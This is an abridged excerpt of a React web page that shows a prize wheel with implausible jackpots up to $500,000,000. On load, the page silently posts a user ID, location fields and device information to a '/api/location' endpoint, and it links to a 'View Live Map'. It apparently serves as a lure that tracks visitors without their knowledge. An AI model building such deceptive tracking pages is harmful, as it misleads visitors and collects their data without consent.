...
const PRIZES = [
  { value: '$10,000', label: 'Mini Jackpot', color: 'bg-gradient-to-r from-pink-500 to-red-500' },
  { value: '$50,000', label: 'Major Prize', color: 'bg-gradient-to-r from-orange-400 to-yellow-400' },
  { value: '$100,000', label: 'Mega Win', color: 'bg-gradient-to-r from-yellow-400 to-green-400' },
  { value: '$500,000', label: 'Ultra Prize', color: 'bg-gradient-to-r from-green-400 to-blue-400' },
  { value: '$1,000,000', label: 'Grand Jackpot', color: 'bg-gradient-to-r from-blue-400 to-purple-500' },
  { value: '$5,000,000', label: 'Super Grand', color: 'bg-gradient-to-r from-purple-500 to-pink-500' },
  { value: '$10,000,000', label: 'Legendary', color: 'bg-gradient-to-r from-pink-500 to-yellow-400' },
  { value: '$50,000,000', label: 'Epic', color: 'bg-gradient-to-r from-yellow-400 to-green-400' },
  { value: '$100,000,000', label: 'Mythic', color: 'bg-gradient-to-r from-green-400 to-blue-400' },
  { value: '$500,000,000', label: 'Ultimate', color: 'bg-gradient-to-r from-blue-400 to-purple-500' },
];
...
function App() {
  ...
  useEffect(() => {
    ...
    fetch('http://localhost:5000/api/location', {
      ...
      body: JSON.stringify({ userId, lat: null, lng: null, deviceInfo })
    });
  }, [userId]);
      ...
      <div className="container">
        ...
        <main className="main-content">
          ...
          <div className="centered">
            <div className="prize-wheel-wrapper">
              ...
              <div
                ...
                style={{
                  width: '100%',
                  height: '100%',
                  background: 'conic-gradient(#ff0000 0% 10%, #ff9900 10% 20%, #ffff00 20% 30%, #33cc33 30% 40%, #0099ff 40% 50%, #9966ff 50% 60%, #ff00cc 60% 70%, #ff0066 70% 80%, #cc00ff 80% 90%, #00ffff 90% 100%)',
            ...
            <Link to="/map" className="map-link">View Live Map</Link>
          </div>
        </main>
